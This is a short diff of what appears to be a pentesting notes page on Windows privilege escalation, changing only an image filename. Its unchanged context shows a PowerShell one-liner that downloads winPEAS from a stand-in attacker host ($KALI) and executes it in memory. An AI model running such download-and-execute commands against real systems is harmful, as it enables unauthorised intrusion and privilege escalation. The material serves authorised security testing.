@@ -372,7 +372,7 @@ Invoke-AllChecks
 <strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (35) (4).png" alt=""><figcaption></figcaption></figure>
 
 
 
